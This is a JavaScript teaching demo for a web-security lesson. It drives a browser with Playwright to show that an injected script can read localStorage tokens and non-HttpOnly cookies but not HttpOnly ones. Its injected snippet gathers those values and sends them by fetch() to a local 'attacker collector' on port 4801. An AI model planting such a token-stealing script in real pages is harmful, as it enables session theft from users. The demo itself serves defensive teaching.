// demo4/storage-xss.mjs — lesson 4.5: one injected script (an XSS, a bad npm package, a rogue extension) runs on
// the page. It reads whatever JavaScript can reach. The HttpOnly cookie is the only place it cannot.
// Needs demo4/storage-server.js on :4804. Prints what the attacker's collector (:4801) received.
import http from 'node:http';
import { chromium } from 'playwright';

let stolen = null;
const collector = http.createServer((req, res) => { stolen = new URL(req.url, 'http://x').searchParams.get('loot'); res.end('ok'); }).listen(4801);

const browser = await chromium.launch();
const page = await browser.newPage();
await page.goto('http://localhost:4804/');

const visible = await page.evaluate(async () => {
  // This is the injected line. It does not need any privilege — it runs with the page.
  const loot = { localStorage: localStorage.getItem('lfid.access'), 'document.cookie': document.cookie };
  try { await fetch('http://localhost:4801/?loot=' + encodeURIComponent(JSON.stringify(loot))); } catch { /* exfil is best-effort */ }
  return loot;
});
await page.waitForTimeout(100);

console.log('what the injected script could read on the page:');
console.log('  localStorage.lfid.access :', visible.localStorage ? visible.localStorage.slice(0, 24) + '…' : '(nothing)', '← STOLEN');
console.log('  document.cookie          :', (visible['document.cookie'] || '(empty)').replace(/(=[\w-]{12})[\w.-]+/g, '$1…'));
console.log('    → contains lfid_access_readable? ', /lfid_access_readable/.test(visible['document.cookie']), '(plain cookie: STOLEN)');
console.log('    → contains lfid_access_httponly? ', /lfid_access_httponly/.test(visible['document.cookie']), '(HttpOnly: invisible to JS)');
console.log('\nthe attacker collector on :4801 received:', stolen ? stolen.slice(0, 60) + '…' : '(nothing)');
await browser.close();
collector.close();
